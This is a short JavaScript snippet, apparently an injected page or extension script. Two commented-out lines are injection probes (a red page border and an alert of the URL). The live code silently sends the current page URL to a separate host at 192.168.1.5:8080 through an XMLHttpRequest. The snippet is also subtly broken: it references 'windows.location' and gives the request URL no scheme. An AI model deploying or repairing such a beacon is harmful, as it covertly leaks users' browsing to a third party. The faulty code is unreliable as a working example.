//document.body.style.border = "5px solid red";
//alert(window.location.href);
var xhttp = new XMLHttpRequest(); 

xhttp.open("GET", "192.168.1.5:8080?url="+windows.location.href, true);
xhttp.send();